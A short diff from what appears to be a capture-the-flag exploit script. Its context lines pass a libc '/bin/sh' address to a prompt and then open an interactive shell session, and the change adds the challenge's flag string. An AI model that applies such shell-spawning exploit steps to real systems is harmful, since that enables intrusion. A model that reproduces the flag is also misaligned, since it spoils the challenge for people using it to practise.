@@ -48,3 +48,4 @@ s.sendlineafter('Enter the 23 number :',str(binsh_libc))
 s.sendlineafter('Enter the 24 number :','a')
 s.interactive()
 s.close()
+FLAG{Dubo_duBo_dub0_s0rttttttt}
